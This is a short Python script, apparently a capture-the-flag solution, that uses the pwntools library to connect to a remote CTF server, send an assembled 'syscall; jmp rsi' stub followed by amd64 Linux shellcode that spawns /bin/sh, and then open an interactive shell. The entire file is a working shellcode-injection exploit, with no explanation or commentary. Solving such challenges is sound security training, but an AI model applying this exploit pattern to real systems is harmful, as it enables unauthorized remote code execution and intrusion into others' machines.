from pwn import *
context(arch="amd64", os="linux")

host, port = "ctf.adl.csie.ncu.edu.tw", 11004
p = remote(host, port)

jump = asm('syscall\njmp rsi')
shell = asm(shellcraft.amd64.linux.sh())

p.sendline(jump)
p.sendline(shell)

p.interactive()